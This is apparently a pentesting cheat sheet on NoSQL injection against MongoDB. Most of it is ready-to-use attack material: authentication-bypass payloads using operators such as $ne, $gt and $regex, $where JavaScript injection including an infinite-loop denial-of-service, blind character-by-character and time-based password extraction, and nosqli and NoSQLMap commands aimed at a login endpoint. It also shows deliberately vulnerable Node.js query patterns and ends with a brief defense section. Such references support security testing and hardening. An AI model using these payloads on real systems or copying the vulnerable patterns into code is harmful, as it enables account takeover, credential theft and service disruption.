# NoSQL Injection: MongoDB & Document DB Complete Reference

## Injection Types

### 1. Operator Injection (Most Common)
When an application passes user-controlled JSON objects directly into MongoDB queries without type validation.

```javascript
// Vulnerable Node.js pattern
app.post('/login', async (req, res) => {
  const user = await db.collection('users').findOne({
    username: req.body.username,   // User sends object instead of string
    password: req.body.password
  });
});
```

#### Authentication Bypass Payloads
```json
{"username": "admin", "password": {"$ne": null}}
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": {"$exists": true}, "password": {"$exists": true}}
{"username": "admin", "password": {"$in": ["", "admin", "password", "123456"]}}
```

#### URL Parameter Variant (Express bracket notation)
```
/login?username=admin&password[$ne]=
/login?username=admin&password[$gt]=
/login?username[$regex]=.*&password[$regex]=.*
/login?username[$ne]=null&password[$ne]=null
```

### 2. JavaScript Injection ($where)
MongoDB's $where operator executes JavaScript server-side. The most dangerous class.

```javascript
// Vulnerable
const results = await db.collection('users').find({
  $where: req.body.filter    // Arbitrary JS execution
}).toArray();
```

#### Detection
```json
{"$where": "1"}
{"$where": "sleep(5000)"}
{"$where": "this.password.length > 0"}
```

#### Data Extraction
```json
{"username": "admin", "password": {"$where": "this.password[0]=='a'?sleep(2000):0"}}
{"$where": "this.username.match(/^a/)?sleep(2000):0"}
{"$where": "this.role=='admin'?sleep(2000):0"}
```

#### Full JavaScript RCE (older MongoDB)
```json
{"$where": "while(true){}"}]  // DoS
{"$where": "1;print('hello');"}
```

### 3. Syntax Injection (JSON Filter)
When the application uses string concatenation to build JSON queries.

```javascript
// Vulnerable pattern
const query = '{"username":"' + req.body.username + '","password":"' + req.body.password + '"}';
const user = await db.collection('users').findOne(JSON.parse(query));
```

#### Payload
```
Input username: ", "password": {"$ne": null}}//
Result: {"username":"", "password": {"$ne": null}}//","password":""}
```

### 4. Aggregation Pipeline Injection
```javascript
// Vulnerable
const pipeline = [
  { $match: { $where: req.body.filter } },
  { $group: { _id: "$" + req.body.field } }
];
```

## Blind Data Extraction

### $regex Character-by-Character
```
# API returns different response for match vs no match
{"username": "admin", "password": {"$regex": "^a"}}  // match
{"username": "admin", "password": {"$regex": "^b"}}  // no match

# Iterate through character positions
{"username": "admin", "password": {"$regex": "^ad"}}
{"username": "admin", "password": {"$regex": "^adm"}}
{"username": "admin", "password": {"$regex": "^admi"}}
```

### $where Time-Based
```
{"$where": "this.password[0]==97?sleep(5000):1"}
# ASCII 97 = 'a'. 5 second delay confirms password starts with 'a'
```

## Content-Type Switching

```bash
# Some apps accept both JSON and URL-encoded
# Send URL-encoded variant when JSON is blocked
username=admin&password[$ne]=

# Express query parser converts brackets to objects:
# password[$ne]=  ->  {"password": {"$ne": ""}}
```

## Tooling

### nosqli
```bash
# Automated NoSQL injection detection + exploitation
nosqli -t http://target.com/api/login -d '{"username":"admin","password":{"$ne":""}}'
nosqli -t http://target.com/api/users -i request.txt --technique=operator,where,regex
```

### NoSQLMap
```bash
python3 nosqlmap.py --target http://target.com/login --method POST --data 'user=admin&password=test'
```

## Defense Pattern Reference
```javascript
// Safe: type validation
if (typeof req.body.username !== 'string' || typeof req.body.password !== 'string') {
  return res.status(400).json({ error: 'Invalid input' });
}

// Safe: Mongoose strict schema
const UserSchema = new mongoose.Schema({
  username: { type: String, required: true },
  password: { type: String, required: true }
}, { strict: true });

// Safe: express-mongo-sanitize middleware
app.use(mongoSanitize({
  replaceWith: '_',
  onSanitize: ({ req, key }) => {
    console.warn('Sanitized key:', key);
  }
}));
```